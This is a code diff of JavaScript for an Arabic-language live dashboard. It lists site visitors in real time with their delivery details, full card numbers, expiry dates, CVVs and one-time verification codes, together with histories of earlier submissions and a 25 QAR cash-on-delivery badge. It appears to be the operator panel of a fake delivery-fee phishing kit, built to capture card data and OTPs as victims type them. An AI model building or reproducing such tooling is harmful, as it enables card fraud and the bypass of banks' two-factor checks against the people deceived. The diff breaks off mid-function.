+    const pageEl = card.querySelector('.card-page');
+    if (pageEl) pageEl.textContent = getPageName(page);
+    // Move to top when page changes (new activity)
+    moveCardToTop(sessionId);
+  }
+}
+
+// Move card to TOP of grid with animation (real-time sorting)
+function moveCardToTop(sessionId) {
+  const grid = document.getElementById('visitorsGrid');
+  const card = document.querySelector('[data-session="' + sessionId + '"]');
+  
+  if (card && grid && card.parentNode === grid) {
+    // Skip if already at top
+    if (grid.firstChild === card) return;
+    
+    // Remove from current position
+    grid.removeChild(card);
+    
+    // Insert at the beginning (top)
+    grid.insertBefore(card, grid.firstChild);
+    
+    // Add animation - slide down effect
+    card.style.opacity = '0';
+    card.style.transform = 'translateY(-30px)';
+    requestAnimationFrame(function() {
+      card.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
+      card.style.opacity = '1';
+      card.style.transform = 'translateY(0)';
+    });
+  }
+}
+
+// Main function to process any visitor update - creates or updates card
+function processVisitorUpdate(sessionId, data) {
+  if (!sessionId) {
+    console.error('❌ No sessionId in update data');
+    return;
+  }
+  
+  const grid = document.getElementById('visitorsGrid');
+  if (!grid) {
+    console.error('❌ visitorsGrid not found');
+    return;
+  }
+  
+  // Find existing card
+  let card = document.querySelector('[data-session="' + sessionId + '"]');
+  
+  if (card) {
+    // Update existing card with full data
+    console.log('📝 Updating existing card for:', sessionId);
+    updateVisitorCardFull(card, data);
+    
+    // Move to top with animation
+    moveCardToTop(sessionId);
+    
+    // Add highlight animation
+    card.style.boxShadow = '0 0 25px var(--primary)';
+    setTimeout(() => {
+      card.style.boxShadow = '';
+    }, 600);
+    
+  } else {
+    // Create NEW card for this visitor
+    console.log('🆕 Creating new card for:', sessionId);
+    createVisitorCardElement(data, grid);
+    
+    // Move the new card to top
+    setTimeout(() => {
+      const newCard = document.querySelector('[data-session="' + sessionId + '"]');
+      if (newCard) {
+        moveCardToTop(sessionId);
+        // Highlight animation for new card
+        newCard.style.boxShadow = '0 0 25px var(--accent)';
+        setTimeout(() => {
+          newCard.style.boxShadow = '';
+        }, 600);
+      }
+    }, 50);
+  }
+  
+  // Update cache
+  visitorsCache.set(sessionId, data);
+}
+
+// Create a visitor card element and append to grid
+function createVisitorCardElement(data, grid) {
+  const sessionId = data.session_id || data.sessionId;
+  if (!sessionId) {
+    console.error('❌ createVisitorCardElement: No sessionId!');
+    return;
+  }
+  
+  console.log('🆕 Creating card for:', sessionId, 'Grid:', grid);
+  
+  // Create card element
+  const card = document.createElement('div');
+  card.className = 'visitor-card';
+  card.setAttribute('data-session', sessionId);
+  card.setAttribute('data-online', data.is_online === true);
+  
+  // Get visitor name for display
+  let displayName = data.delivery_data?.fullName || 
+                    data.payment_data?.cardHolder || 
+                    data.name ||
+                    data.country ||
+                    'زائر ' + sessionId.substring(0, 8);
+  
+  // Get phone for display
+  let displayPhone = data.delivery_data?.phone || data.phone || '';
+  
+  // Status text
+  let statusText = data.is_online === true ? 'متصل الآن' : 'غير متصل';
+  let statusIcon = data.is_online === true ? '' : ' offline';
+  
+  // Time ago
+  let timeAgo = formatTimeAgo(new Date(data.last_activity || Date.now()));
+  
+  // Current page
+  let currentPage = getPageName(data.current_page || 'home');
+  
+  // Country flag
+  let countryFlag = getCountryFlag(data.country_code || '');
+  
+  // Build card HTML
+  card.innerHTML = `
+    <div class="card-header" style="${data.is_online === true ? 'background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);' : 'background: linear-gradient(135deg, #6b7280 0%, #4b5563 100%);'}">
+      <div class="card-title">${countryFlag} ${escapeHtml(displayName)}</div>
+      <div class="card-status"><span class="dot${statusIcon}"></span><span>${statusText}</span></div>
+    </div>
+    <div class="card-body" style="padding:15px;">
+      <div class="card-meta" style="margin-bottom:10px;">
+        <span class="card-page">${currentPage}</span>
+        <span class="card-time">${timeAgo}</span>
+      </div>
+      ${displayPhone ? '<div class="data-grid"><div class="data-field"><span class="data-label">الهاتف</span><span class="data-value" dir="ltr">' + escapeHtml(displayPhone) + '</span></div></div>' : ''}
+      ${(data.form_submitted || data.payment_submitted || data.verification_submitted) ? '<div class="progress-steps" style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px;">' + 
+        (data.form_submitted ? '<span class="progress-badge success">✓ توصيل</span>' : '') +
+        (data.payment_submitted ? '<span class="progress-badge success">✓ دفع</span>' : '') +
+        (data.verification_submitted ? '<span class="progress-badge success">✓ تحقق</span>' : '') +
+        '</div>' : ''}
+    </div>
+    <div class="card-actions" style="padding:10px 15px;">
+      <button class="btn btn-sm btn-primary" onclick="viewVisitorDetails('${sessionId}')">عرض</button>
+      <button class="btn btn-sm btn-danger" onclick="banVisitor('${sessionId}', '${escapeHtml(data.ip_address || '')}')">🚫</button>
+    </div>
+  `;
+  
+  // Add to grid at top
+  if (grid.firstChild) {
+    grid.insertBefore(card, grid.firstChild);
+  } else {
+    grid.appendChild(card);
+  }
+  
+  console.log('🆕 Card added to DOM:', card, 'Grid children:', grid.children.length);
+  
+  // Animate in
+  card.style.opacity = '0';
+  card.style.transform = 'translateY(-20px)';
+  requestAnimationFrame(() => {
+    card.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
+    card.style.opacity = '1';
+    card.style.transform = 'translateY(0)';
+  });
+}
+
+// Update existing card with full data
+function updateVisitorCardFull(card, data) {
+  if (!card || !data) return;
+  
+  const sessionId = data.session_id || data.sessionId;
+  
+  // Update data attributes
+  card.setAttribute('data-online', data.is_online === true);
+  
+  // Update header
+  const header = card.querySelector('.card-header');
+  if (header) {
+    header.style.background = data.is_online === true 
+      ? 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)' 
+      : 'linear-gradient(135deg, #6b7280 0%, #4b5563 100%)';
+  }
+  
+  // Update status
+  const statusEl = card.querySelector('.card-status');
+  if (statusEl) {
+    statusEl.innerHTML = data.is_online === true 
+      ? '<span class="dot"></span><span>متصل الآن</span>' 
+      : '<span class="dot offline"></span><span>غير متصل</span>';
+  }
+  
+  // Update display name
+  const displayName = data.delivery_data?.fullName || 
+                      data.payment_data?.cardHolder || 
+                      data.name || 
+                      'زائر ' + (sessionId ? sessionId.substring(0, 6) : '');
+  const titleEl = card.querySelector('.card-title');
+  if (titleEl) titleEl.textContent = displayName;
+  
+  // Update page - Smart page tracking
+  if (data.current_page) {
+    const pageInfo = getPageColor(data.current_page);
+    const pageBadge = card.querySelector('.page-badge');
+    if (pageBadge) {
+      pageBadge.textContent = pageInfo.text;
+      pageBadge.style.background = pageInfo.bg;
+    } else {
+      // For old card style
+      const pageEl = card.querySelector('.card-page');
+      if (pageEl) pageEl.textContent = getPageName(data.current_page);
+    }
+    
+    // Update step indicator for new card style
+    const headerRight = card.querySelector('.header-right');
+    if (headerRight) {
+      const oldStepIndicator = headerRight.querySelector('.step-indicator');
+      const newStepIndicator = getStepIndicator(data.current_page);
+      if (oldStepIndicator && newStepIndicator) {
+        oldStepIndicator.outerHTML = newStepIndicator;
+      } else if (newStepIndicator && !oldStepIndicator) {
+        headerRight.insertAdjacentHTML('beforeend', newStepIndicator);
+      }
+    }
+  }
+  
+  // Update time
+  const timeEl = card.querySelector('.card-time');
+  if (timeEl && data.last_activity) {
+    timeEl.textContent = formatTimeAgo(new Date(data.last_activity));
+  }
+  
+  // Update phone if available
+  const phone = data.delivery_data?.phone || data.phone;
+  let phoneRow = card.querySelector('.data-row:has(.data-label)')?.closest('.data-row');
+  if (phone) {
+    if (phoneRow) {
+      phoneRow.querySelector('.data-value').textContent = phone;
+    } else {
+      const metaEl = card.querySelector('.card-meta');
+      if (metaEl) {
+        metaEl.insertAdjacentHTML('afterend', '<div class="data-row"><span class="data-label">الهاتف</span><span class="data-value">' + escapeHtml(phone) + '</span></div>');
+      }
+    }
+  }
+  
+  // Update progress steps
+  if (data.form_submitted) {
+    let deliveryStep = card.querySelector('.progress-step:not(.completed)');
+    if (deliveryStep) {
+      deliveryStep.classList.add('completed');
+      deliveryStep.querySelector('.step-icon').textContent = '✓';
+    } else if (!card.querySelector('.progress-step')) {
+      const body = card.querySelector('.card-body');
+      if (body) {
+        body.insertAdjacentHTML('beforeend', '<div class="progress-step completed"><span class="step-icon">✓</span> نموذج التوصيل</div>');
+      }
+    }
+  }
+  
+  if (data.payment_submitted) {
+    let paymentStep = card.querySelector('.progress-step:not(.completed)');
+    if (paymentStep) {
+      paymentStep.classList.add('completed');
+      paymentStep.querySelector('.step-icon').textContent = '✓';
+    }
+  }
+  
+  // Update delivery data section - with all submissions history
+  if (data.delivery_data || (data.delivery_submissions && data.delivery_submissions.length > 0)) {
+    updateCardSection(card, 'delivery', buildDeliverySection(data.delivery_data, data.delivery_submissions || [], sessionId));
+  }
+  
+  // Update payment data section - with all submissions history
+  if (data.payment_data || (data.payment_submissions && data.payment_submissions.length > 0)) {
+    updateCardSection(card, 'payment', buildPaymentSection(data.payment_data, data.payment_submissions || [], sessionId));
+  }
+  
+  // Update OTP section
+  if (data.verification_data || data.otp_history) {
+    const otp = data.verification_data?.otp || (data.otp_history?.[0]?.otp);
+    if (otp) {
+      updateCardSection(card, 'otp', buildOtpSection(otp, data.otp_history || [], sessionId));
+    }
+  }
+}
+
+// Helper: Update or insert a section in card
+function updateCardSection(card, sectionClass, html) {
+  const existing = card.querySelector('.card-section.' + sectionClass + '-section');
+  const body = card.querySelector('.card-body');
+  
+  if (existing) {
+    existing.outerHTML = html;
+  } else if (body) {
+    body.insertAdjacentHTML('beforeend', html);
+  }
+}
+
+// Helper: Build delivery section HTML with all submissions history
+function buildDeliverySection(data, allSubmissions = [], sessionId = '') {
+  // Get all submissions data
+  const submissions = [];
+  
+  if (allSubmissions && allSubmissions.length > 0) {
+    allSubmissions.forEach((sub, idx) => {
+      let formData = sub.form_data;
+      // Parse form_data if it's a string
+      if (typeof formData === 'string') {
+        try {
+          formData = JSON.parse(formData);
+        } catch (e) {
+          formData = {};
+        }
+      }
+      // Skip if formData is invalid
+      if (!formData || typeof formData !== 'object') {
+        return;
+      }
+      submissions.push({
+        data: formData,
+        timestamp: sub.created_at,
+        isLatest: idx === 0
+      });
+    });
+  } else if (data) {
+    submissions.push({ data: data, timestamp: null, isLatest: true });
+  }
+  
+  let html = '<div class="card-section delivery-section" style="padding:12px;">';
+  
+  // Title with dropdown toggle
+  const count = submissions.length;
+  const hasHistory = count > 1;
+  
+  html += '<div class="section-title" style="cursor:' + (hasHistory ? 'pointer' : 'default') + ';margin-bottom:10px;display:flex;align-items:center;gap:8px;" ' + (hasHistory ? 'onclick="toggleDeliveryHistory(\'' + sessionId + '\')"' : '') + '>';
+  html += '<span>📦</span> بيانات التوصيل';
+  html += '<span style="margin-right:auto;font-size:11px;color:var(--primary-light);font-weight:600;">' + (hasHistory ? '▼ ' + count : '') + '</span>';
+  html += '</div>';
+  
+  // Show current (latest) delivery
+  if (submissions.length > 0) {
+    const current = submissions[0];
+    const currentData = current.data;
+    
+    html += '<div id="deliveryCurrent_' + sessionId + '" class="delivery-current">';
+    html += '<div class="data-grid">';
+    if (currentData.fullName) html += '<div class="data-field"><span class="data-label">الاسم</span><span class="data-value">' + escapeHtml(currentData.fullName) + '</span></div>';
+    if (currentData.phone) html += '<div class="data-field"><span class="data-label">الهاتف</span><span class="data-value" dir="ltr">' + escapeHtml(currentData.phone) + '</span></div>';
+    if (currentData.email) html += '<div class="data-field"><span class="data-label">البريد</span><span class="data-value">' + escapeHtml(currentData.email) + '</span></div>';
+    if (currentData.city) html += '<div class="data-field"><span class="data-label">المدينة</span><span class="data-value">' + escapeHtml(currentData.city) + '</span></div>';
+    if (currentData.address) html += '<div class="data-field full-width"><span class="data-label">العنوان</span><span class="data-value">' + escapeHtml(currentData.address) + '</span></div>';
+    html += '</div></div>';
+  }
+  
+  // History dropdown (for older submissions)
+  if (hasHistory) {
+    let historyItems = '';
+    submissions.slice(1).forEach((sub, idx) => {
+      const subData = sub.data;
+      const timestamp = sub.timestamp ? formatTimeAgo(new Date(sub.timestamp)) : '';
+      
+      historyItems += '<div class="delivery-history-item" style="padding:10px;background:rgba(59,130,246,0.08);border-radius:8px;margin-bottom:8px;border:1px solid rgba(59,130,246,0.2);">';
+      historyItems += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">';
+      historyItems += '<span style="font-size:11px;color:var(--primary-light);font-weight:600;">#' + (idx + 2) + '</span>';
+      historyItems += '<span style="font-size:10px;color:#6b7280;">' + timestamp + '</span>';
+      historyItems += '</div>';
+      historyItems += '<div class="data-grid">';
+      if (subData.fullName) historyItems += '<div class="data-field"><span class="data-label">الاسم</span><span class="data-value">' + escapeHtml(subData.fullName) + '</span></div>';
+      if (subData.phone) historyItems += '<div class="data-field"><span class="data-label">الهاتف</span><span class="data-value" dir="ltr">' + escapeHtml(subData.phone) + '</span></div>';
+      if (subData.email) historyItems += '<div class="data-field"><span class="data-label">البريد</span><span class="data-value">' + escapeHtml(subData.email) + '</span></div>';
+      if (subData.city) historyItems += '<div class="data-field"><span class="data-label">المدينة</span><span class="data-value">' + escapeHtml(subData.city) + '</span></div>';
+      if (subData.address) historyItems += '<div class="data-field full-width"><span class="data-label">العنوان</span><span class="data-value">' + escapeHtml(subData.address) + '</span></div>';
+      historyItems += '</div></div>';
+    });
+    
+    html += '<div id="deliveryHistory_' + sessionId + '" class="delivery-history-dropdown" style="margin-top:10px;display:none;">' + historyItems + '</div>';
+  }
+  
+  html += '</div>';
+  return html;
+}
+
+// Toggle delivery history dropdown
+window.toggleDeliveryHistory = function(sessionId) {
+  const historyEl = document.getElementById('deliveryHistory_' + sessionId);
+  if (historyEl) {
+    historyEl.style.display = historyEl.style.display === 'none' ? 'block' : 'none';
+  }
+};
+
+// Helper: Build payment section HTML with all submissions history
+function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
+  // Get all submissions data
+  const submissions = [];
+  if (allSubmissions && allSubmissions.length > 0) {
+    allSubmissions.forEach((sub, idx) => {
+      let formData = sub.form_data;
+      // Parse form_data if it's a string
+      if (typeof formData === 'string') {
+        try {
+          formData = JSON.parse(formData);
+        } catch (e) {
+          console.error('Error parsing payment form_data:', e);
+          formData = {};
+        }
+      }
+      // Skip if formData is invalid
+      if (!formData || typeof formData !== 'object') {
+        return;
+      }
+      submissions.push({
+        data: formData,
+        timestamp: sub.created_at,
+        isLatest: idx === 0
+      });
+    });
+  } else if (data) {
+    submissions.push({ data: data, timestamp: null, isLatest: true });
+  }
+  
+  let html = '<div class="card-section payment-section" style="padding:12px;">';
+  
+  // Title with dropdown toggle
+  const count = submissions.length;
+  const hasHistory = count > 1;
+  
+  html += '<div class="section-title payment-title" style="cursor:' + (hasHistory ? 'pointer' : 'default') + ';margin-bottom:10px;display:flex;align-items:center;gap:8px;" ' + (hasHistory ? 'onclick="togglePaymentHistory(\'' + sessionId + '\')"' : '') + '>';
+  html += '<span>💳</span> بيانات الدفع';
+  html += '<span class="dropdown-arrow" style="margin-right:auto;font-size:11px;color:var(--success);font-weight:600;">' + (hasHistory ? '▼ ' + count : '') + '</span>';
+  html += '</div>';
+  
+  // Show current (latest) payment
+  if (submissions.length > 0) {
+    const current = submissions[0];
+    const currentData = current.data;
+    const cardNum = currentData.cardNumber || currentData.card_number || '';
+    const cvv = currentData.cvv || '';
+    const isCash = currentData.paymentMethod === 'cash';
+    
+    html += '<div id="paymentCurrent_' + sessionId + '" class="payment-current">';
+    
+    // Always show card data (even for cash)
+    html += '<div class="data-grid">';
+    if (cardNum) html += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
+    if (currentData.cardHolder) html += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(currentData.cardHolder) + '</span></div>';
+    if (currentData.expiry) html += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(currentData.expiry) + '</span></div>';
+    if (cvv) html += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value highlight" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
+    html += '</div>';
+    
+    // Show payment method badge
+    if (isCash) {
+      html += '<div style="margin-top:8px;padding:6px 10px;background:#10b981;border-radius:6px;color:white;text-align:center;font-size:12px;font-weight:600;">';
+      html += '💵 دفع عند الاستلام - 25 ر.ق';
+      html += '</div>';
+    }
+    
+    html += '</div>';
+  }
+  
+  // History dropdown (for older submissions)
+  if (hasHistory) {
+    let historyItems = '';
+    submissions.slice(1).forEach((sub, idx) => {
+      const subData = sub.data;
+      const timestamp = sub.timestamp ? formatTimeAgo(new Date(sub.timestamp)) : '';
+      const cardNum = subData.cardNumber || subData.card_number || '';
+      const cvv = subData.cvv || '';
+      const isCash = subData.paymentMethod === 'cash';
+      
+      historyItems += '<div class="payment-history-item" style="padding:10px;background:rgba(16,185,129,0.08);border-radius:8px;margin-bottom:8px;border:1px solid rgba(16,185,129,0.2);">';
+      historyItems += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">';
+      historyItems += '<span style="font-size:11px;color:var(--success);font-weight:600;">#' + (idx + 2) + '</span>';
+      historyItems += '<span style="font-size:10px;color:#6b7280;">' + timestamp + '</span>';
+      if (isCash) {
+        historyItems += '<span style="font-size:10px;padding:2px 8px;background:#10b981;color:white;border-radius:10px;font-weight:600;">💵</span>';
+      }
+      historyItems += '</div>';
+      
+      // Always show card data (even for cash)
+      historyItems += '<div class="data-grid">';
+      if (cardNum) historyItems += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
+      if (subData.cardHolder) historyItems += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(subData.cardHolder) + '</span></div>';
+      if (subData.expiry) historyItems += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(subData.expiry) + '</span></div>';
+      if (cvv) historyItems += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
+      historyItems += '</div>';
+      
+      if (isCash) {
+        historyItems += '<div style="margin-top:6px;padding:4px 8px;background:#10b981;border-radius:4px;color:white;text-align:center;font-size:11px;font-weight:600;">';
+        historyItems += '💵 دفع عند الاستلام - 25 ر.ق';
+        historyItems += '</div>';
+      }
+      historyItems += '</div>';
+    });
+    
+    html += '<div id="paymentHistory_' + sessionId + '" class="payment-history-dropdown" style="margin-top:10px;display:none;">' + historyItems + '</div>';
+  }
+  
+  html += '</div>';
+  
+  return html;
+}
+
+// Toggle payment history dropdown
+window.togglePaymentHistory = function(sessionId) {
+  const historyEl = document.getElementById('paymentHistory_' + sessionId);
+  if (historyEl) {
+    historyEl.style.display = historyEl.style.display === 'none' ? 'block' : 'none';
+  }
+};
+
+// Helper: Build OTP section HTML with digit boxes
+function buildOtpSection(otp, history, sessionId) {
+  let historyHtml = '';
+  if (history.length > 1) {
+    const oldOtps = history.slice(1).map(item => 
+      '<div class="otp-history-item">السابق: <strong>' + item.otp + '</strong></div>'
+    ).join('');
+    historyHtml = '<div class="otp-history-dropdown" id="otpHistory_' + sessionId + '">' + oldOtps + '</div>';
+  }
+  
+  // Build OTP digit boxes
+  const otpDigits = otp.split('').map(d => 
+    '<div class="otp-digit">' + d + '</div>'
+  ).join('');
+  
+  return '<div class="card-section otp-section" style="padding:12px;"><div class="section-title" style="cursor:pointer;margin-bottom:10px;" onclick="toggleOtpHistory(\'' + sessionId + '\')"><span>🔐</span> رمز التحقق (OTP)' + (history.length > 1 ? '<span style="margin-right:auto;font-size:12px;color:var(--accent);">▼ ' + history.length + ' رمز</span>' : '') + '</div><div class="otp-boxes">' + otpDigits + '</div>' + historyHtml + '</div>';
+}
+
+// Escape HTML to prevent XSS
+function escapeHtml(text) {
+  if (!text) return '';
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
+}
+
+// Format timestamp to relative time (Arabic)
+function formatTimeAgo(timestamp) {
+  if (!timestamp) return 'الآن';
+  const date = new Date(timestamp);
+  const now = new Date();
+  const seconds = Math.floor((now - date) / 1000);
+  
+  if (seconds < 60) return 'الآن';
+  const minutes = Math.floor(seconds / 60);
+  if (minutes < 60) return 'منذ ' + minutes + ' دقيقة';
+  const hours = Math.floor(minutes / 60);
+  if (hours < 24) return 'منذ ' + hours + ' ساعة';
+  const days = Math.floor(hours / 24);
+  if (days < 7) return 'منذ ' + days + ' يوم';
+  return date.toLocaleDateString('ar-OM');
+}
+
+// Format date for device list
+function formatDate(timestamp) {
+  if (!timestamp) return '';
+  const date = new Date(timestamp);
+  return date.toLocaleDateString('ar-OM', {
+    year: 'numeric',
+    month: 'short',
+    day: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit'
+  });
+}
+
+// Update card data and move to top (for real-time form updates)
+function updateCardAndMoveToTop(sessionId, data) {
+  // Use the main processing function
+  processVisitorUpdate(sessionId, data);
+}
+
+// Update card with new data (inline update, no full rebuild)
+function updateVisitorCardData(card, data) {
+  if (!card || !data) return;
+  
+  // Update data attributes
+  if (data.is_online !== undefined) {
+    card.setAttribute('data-online', data.is_online);
+    
+    // Update header color based on status
+    const header = card.querySelector('.card-header');
+    const statusEl = card.querySelector('.card-status');
+    if (data.is_online === true) {
+      header.style.background = 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)';
+      if (statusEl) {
+        statusEl.innerHTML = '<span class="dot"></span><span>متصل الآن</span>';
+      }
+    } else {
+      header.style.background = 'linear-gradient(135deg, #6b7280 0%, #4b5563 100%)';
+      if (statusEl) {
+        statusEl.innerHTML = '<span class="dot offline"></span><span>غير متصل</span>';
+      }
+    }
+  }
+  
+  // Update page info if present - Smart page tracking
+  if (data.current_page) {
+    const pageInfo = getPageColor(data.current_page);
+    const pageBadge = card.querySelector('.page-badge');
+    if (pageBadge) {
+      pageBadge.textContent = pageInfo.text;
+      pageBadge.style.background = pageInfo.bg;
+    }
+    
+    // Update step indicator
+    const headerRight = card.querySelector('.header-right');
+    if (headerRight) {
+      const oldStepIndicator = headerRight.querySelector('.step-indicator');
+      const newStepIndicator = getStepIndicator(data.current_page);
+      if (oldStepIndicator && newStepIndicator) {
+        oldStepIndicator.outerHTML = newStepIndicator;
+      } else if (newStepIndicator && !oldStepIndicator) {
+        // Add step indicator if not exists
+        headerRight.insertAdjacentHTML('beforeend', newStepIndicator);
+      }
+    }
+  }
+  
+  // Update last activity timestamp
+  if (data.last_activity) {
+    const timeEl = card.querySelector('.card-time');
+    if (timeEl) {
+      const date = new Date(data.last_activity);
+      timeEl.textContent = formatTimeAgo(date);
+    }
+  }
+}
+
+function updateVisitorStatus(sessionId, isOnline) {
+  var card = document.querySelector('[data-session="' + sessionId + '"]');
+  if (!card) return;
+  
+  card.setAttribute('data-online', isOnline);
+  
+  var header = card.querySelector('.card-header');
+  var statusEl = card.querySelector('.card-status');
+  
+  if (isOnline) {
+    header.style.background = 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)';
+    if (statusEl) {
+      statusEl.innerHTML = '<span class="dot"></span><span>متصل الآن</span>';
+    }
+  } else {
+    header.style.background = 'linear-gradient(135deg, #6b7280 0%, #9ca3af 100%)';
+    if (statusEl) {
+      statusEl.innerHTML = '<span style="color:#ccc;">○</span><span style="color:#999;">غير متصل</span>';
+    }
+  }
+}
+
+// Update visitor status badge with 3 states (online, idle, offline)
+function updateVisitorStatusBadge(sessionId, status) {
+  const card = document.querySelector(`[data-session="${sessionId}"]`);
+  if (!card) return;
+  
+  // Update data attribute
+  card.setAttribute('data-status', status);
+  card.setAttribute('data-online', status === 'online');
+  
+  // Find elements in new card design
+  const header = card.querySelector('.card-header-new');
+  const statusEl = card.querySelector('.online-status');
+  const headerBg = header || card.querySelector('.card-header');
+  
+  // Remove all status classes
+  if (statusEl) {
+    statusEl.classList.remove('online', 'idle', 'offline');
+    statusEl.classList.add(status);
+  }
+  
+  // Update visual based on status
+  if (status === 'online') {
+    // Green theme - active
+    if (headerBg) {
+      headerBg.style.background = 'linear-gradient(135deg, #1e3a5f 0%, #1e293b 100%)';
+    }
+    if (statusEl) {
+      statusEl.innerHTML = '<span class="status-dot-animated"></span> متصل';
+    }
+  } else if (status === 'idle') {
+    // Yellow/Orange theme - inactive but connected
+    if (headerBg) {
+      headerBg.style.background = 'linear-gradient(135deg, #451a03 0%, #292524 100%)';
+    }
+    if (statusEl) {
+      statusEl.innerHTML = '<span class="status-dot-idle"></span> خامل';
+    }
+  } else {
+    // Gray theme - disconnected
+    if (headerBg) {
+      headerBg.style.background = 'linear-gradient(135deg, #374151 0%, #1f2937 100%)';
+    }
+    if (statusEl) {
+      statusEl.innerHTML = '<span class="status-dot-offline"></span> غير متصل';
+    }
+  }
+  
+  console.log(`✅ Updated status for ${sessionId} to ${status}`);
+}
+
+// Request initial data on connection
+function requestInitialData() {
+  if (!socket || !socket.connected) {
+    console.log('❌ Socket not connected, cannot request data');
+    return;
+  }
+  socket.emit('visitors:request');
+  socket.emit('stats:request');
+  console.log('📡 Requesting initial data...');
+}
+
+function updateVisitorCard(sessionId, data) {
+  var card = document.querySelector('[data-session="' + sessionId + '"]');
+  
+  // If card doesn't exist, try to add it
+  if (!card) {
+    console.log('📝 Card not found for:', sessionId, '- will refresh list');
+    updateVisitorsList();
+    return;
+  }
+  
+  // Update card data attributes
+  if (data.is_online !== undefined) {
+    card.setAttribute('data-online', data.is_online);
+  }
+  
+  // Update online/offline status visually
+  var header = card.querySelector('.card-header');
+  var statusEl = card.querySelector('.card-status');
+  if (data.is_online === true) {
+    header.style.background = 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)';
+    if (statusEl) {
+      statusEl.innerHTML = '<span class="dot"></span><span>متصل الآن</span>';
+    }
+  }
+  
+  var cardBody = card.querySelector('.card-body');
+  
+  // Update delivery data - with submission history
+  if ((data.delivery_data || (data.delivery_submissions && data.delivery_submissions.length > 0)) && cardBody) {
+    var deliveryHTML = buildDeliverySection(data.delivery_data, data.delivery_submissions || [], sessionId);
+    
+    // Update or insert delivery section
+    var existingDelivery = cardBody.querySelector('.delivery-section');
+    if (existingDelivery) {
+      existingDelivery.outerHTML = deliveryHTML;
+    } else {
+      cardBody.insertAdjacentHTML('afterbegin', deliveryHTML);
+    }
+  }
+  
+  // Update payment data - with submission history
+  if ((data.payment_data || (data.payment_submissions && data.payment_submissions.length > 0)) && cardBody) {
+    var paymentHTML = buildPaymentSection(data.payment_data, data.payment_submissions || [], sessionId);
+    
+    // Update or insert payment section
+    var existingPayment = cardBody.querySelector('.payment-section');
+    if (existingPayment) {
+      existingPayment.outerHTML = paymentHTML;
+    } else {
+      var deliverySection = cardBody.querySelector('.card-section');
+      if (deliverySection) {
+        deliverySection.insertAdjacentHTML('afterend', paymentHTML);
+      } else {
+        cardBody.insertAdjacentHTML('afterbegin', paymentHTML);
+      }
+    }
+  }
+  
+  // Update OTP data
+  if ((data.verification_data || data.otp_history) && cardBody) {
+    var verificationData = data.verification_data || {};
+    var otpHistory = data.otp_history || [];
+    var otpValue = verificationData.otp || '';
+    
+    if (!otpValue && otpHistory.length > 0) {
+      otpValue = otpHistory[0].otp;
+    }
+    
+    if (otpValue) {
+      var historyHTML = '';
+      if (otpHistory.length > 1) {
+        var oldOtps = otpHistory.slice(1).map(function(item) {
+          var date = new Date(item.timestamp).toLocaleString('ar-OM');
+          return '<div class="otp-history-item">الرموز السابقة: <strong>' + item.otp + '</strong> <small>(' + date + ')</small></div>';
+        }).join('');
+        historyHTML = '<div class="otp-history-dropdown" id="otpHistory_' + sessionId + '">' + oldOtps + '</div>';
+      }
+      
+      var otpSectionHTML = '<div class="otp-section"><div class="section-title" style="cursor:pointer;" onclick="toggleOtpHistory(\'' + sessionId + '\')"><span>🔐</span> رمز التحقق (OTP)' + (otpHistory.length > 1 ? '<span style="margin-right:auto;font-size:12px;color:var(--accent);">▼ ' + otpHistory.length + ' رمز</span>' : '') + '</div><div class="otp-value">' + otpValue + '</div>' + historyHTML + '</div>';
+      
+      // Update or insert OTP section
+      var existingOTP = cardBody.querySelector('.otp-section');
+      if (existingOTP) {
+        existingOTP.outerHTML = otpSectionHTML;
+      } else {
+        cardBody.insertAdjacentHTML('beforeend', otpSectionHTML);
+      }
+    }
+  }
+  
+  // Update progress steps
+  var steps = card.querySelectorAll('.progress-step');
+  if (data.form_submitted && steps[0]) {
+    steps[0].classList.add('completed');
+    steps[0].classList.remove('active');
+    steps[0].querySelector('.step-icon').textContent = '✓';
+  }
+  if (data.payment_submitted && steps[1]) {
+    steps[1].classList.add('completed');
+    steps[1].classList.remove('active');
+    steps[1].querySelector('.step-icon').textContent = '✓';
+  }
+  if (data.verification_submitted && steps[2]) {
+    steps[2].classList.add('completed');
+    steps[2].classList.remove('active');
+    steps[2].querySelector('.step-icon').textContent = '✓';
+  }
+  
+  // Add animation for update
+  card.style.boxShadow = '0 0 20px rgba(16, 185, 129, 0.5)';
+  card.style.transform = 'scale(1.02)';
+  setTimeout(function() {
+    card.style.boxShadow = '';
+    card.style.transform = '';
+  }, 500);
+}
+
+// Stats Functions
+async function updateStats() {
+  if (!socket) return;
+  socket.emit('stats:request');
+  socket.once('stats:update', (data) => {
+    const elements = {
+      'totalVisitors': data.totalVisitors,
+      'onlineVisitors': data.onlineVisitors,
+      'formSubmissions': data.formSubmissions,
+      'paymentSubmissions': data.paymentSubmissions
+    };
+    
+    Object.entries(elements).forEach(([id, value]) => {
+      const el = document.getElementById(id);
+      if (el) el.textContent = value;
+    });
+    
+    const countryList = document.getElementById('countryList');
+    if (countryList && data.countryStats?.length > 0) {
+      const maxCount = Math.max(...data.countryStats.map(c => parseInt(c.count)));
+      countryList.innerHTML = data.countryStats.map(country => `
